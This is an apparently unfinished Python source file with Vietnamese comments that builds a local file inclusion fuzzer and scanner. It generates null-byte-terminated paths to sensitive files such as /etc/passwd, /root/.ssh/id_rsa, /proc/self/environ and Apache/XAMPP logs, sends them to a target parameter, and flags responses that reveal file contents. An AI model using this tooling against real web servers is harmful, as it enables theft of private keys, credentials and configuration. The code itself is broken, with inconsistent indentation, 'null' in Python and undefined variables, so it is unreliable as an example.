from a import simple_grammar_fuzzer
from connect import connect
'''
LFI thì làm gì bây giờ nhỉ


với lỗi này thì
xác định request và tham số rồi gửi tới nó đưòng dẫn file mà mình mong muốn


Đầu tiên thì cần xây dựng fuzzer: chịu trách nhiệm tạo ra các đường dẫn file một cách hợp lệ

Chia ra làm 2 loại đường dẫn: Windown và Linux

tham khảo trên payload of the thing nào


phải kết hợp thêm null byte ở cuối nữa mới ổn áp!!!! 
'''
#---- for windows

detect = {"include: Failed", "root:x:x"}
class lfi():
    def generator(self, GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR) for i in range(1000)])

    def window_lfi(self):
        widnow = {
                    "@start@" : ["@disk@@directory@%00"],

                    "@disk@" : ["C:\\", "D:\\"],

                    "@directory@" : ["@xampp@",  "@apache@"],

                    "@xampp@" : [ "xampp\@pathxampp@\@filexampp@" ],

                    "@apache@" : [ "apache\@pathapache@\@filexampp@" ],

                    "@pathxampp@" : [ "phpMyAdmin", "apache", "FileZillaFTP", "MercuryMail", "tomcat", "php", "sendmail" , "mysql", "logs"],

                    "@pathapache@" : ["logs"],

                    "@filexampp@" : ["config.inc", "phpinfo.php", "config.inc.php", "error.log","access.log"],

                    "@fileapache@" : ["error.log", "access.log"],
        }

        return self.generator(widnow)

    #---- for linux
    def linux_lfi(self):
        linux = {
                    "@start@" : ["/@folder@"],

                    "@folder@" : ["etc/@directoryEtc@", "opt/@directoryOpt@", "proc/@directoryProc@", "root/@directoryRoot@", "@directoryUsr@", "var/@directoryVar@@endVar@"],


                    "@directoryEtc@" : ["passwd" , "group" , "hosts", "motd" , "issue", "bashrc", "apache2/@fileApache2@" , "httpd/logs/@fileHttpd@"],

                    "@fileApache2@" : ["apache2.conf", "ports.conf" , "sites-available/default"],

                    "@fileHttpd@" : ["access.log", "error.log"],

                    "@directoryOpt@" : ["lampp/logs/@fileHttpd@"],

                    "@directoryProc@" : ["version", "cmdline", "mounts", "config.gz", "self/environ"],

                    "@directoryRoot@" : [".bashrc" , ".bash_history" , ".ssh/@sshFile@"],

                    "@sshFile@" : ["authorized_keys", "id_rsa", "id_rsa.keystore", "id_rsa.pub" , "known_hosts"],

                    "@directoryUsr@" :    ["usr/local/@apache@/htdocs/index.html",
                                        "usr/local/@apache@/htdocs/index.html",
                                        "usr/local/@apache@/conf/extra/httpd-ssl.conf",
                                        "usr/local/@apache@/logs/error_log",
                                        "usr/local/@apache@/logs/access_log",
                                        "usr/local/@apache@/bin/apachectl"],
                    "@apache@" : ["apache", "apache2"],

                    "@directoryVar@" : ["apache/logs/", "log/apache/", "log/httpd/", "log/nginx/"],

                    "@endVar@" : ["access_log", "access.log" , "error_log", "error.log"]
        }
        return self.generator(linux)

    # url = http://example.com?file=... 
    # payload = abc.file
    def scanner(self, url, method, param, payload):
        	    status_code = 500
        r = null
        content = null
        status_code = 200
        conn = connect()
        

        # Cần phải truyền thêm parameter vào để phục vụ cho chức năng post
	    try:
            if method == "GET":
                url = url+ payload # nối chuỗi nào! 
	    	    r = conn.render_GET(url, payload)
            if method == "POST": 
                r = conn.normal_POST(url, param, payload)

	    	content = r.content
	    	status_code = r.status_code
	    except:
	        print "[!] Problem reaching '%s'." %website
	      	content = ""

	    # detect signal in response content
	    if(status_code == 200):
	        if ("[<a href='function.main'>function.main</a>" not in content
	        	and "[<a href='function.include'>function.include</a>" not in content
	        	and ("Failed opening" not in content and "for inclusion" not in content)
	        	and "failed to open stream:" not in content
	        	and "open_basedir restriction in effect" not in content
	        	and ("root:" in content or ("sbin" in content and "nologin" in content)
	            or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content
	            or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
	            or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
	            or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
	            or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
	            or ("error]" in content and "[client" in content and "log" in website)
	            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
	            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
	            	and "/proc/self/status" in website))):

                ''' 
                Nếu phát hiện những file quan trọng thì tiến hành cảnh báo
                ví dụ như phát hiện thấy file /proc/self/environ thì report
                tới người dùng
                '''


	            ahpaths.append(website)
                                                
	            if("log" in website):
	            	ahlogs.append(website)
	            elif("/proc/self/environ" in website):
	            	ahenv.append(website)
	            elif("/proc/self/fd" in website):
	            	ahfd.append(website)
	            elif(".cnf" in website or ".conf" in website or ".ini" in website):
	            	ahcnf.append(website)
	            else:
					ahgen.append(website)
	        else:
	            print "[-] '%s' [Not vulnerable]" %website
	    else:
	        print "[!] Problem connecting to the website.\n"

	print colored("\n[+] Retrieved %s interesting paths.\n" %len(ahpaths),"white")

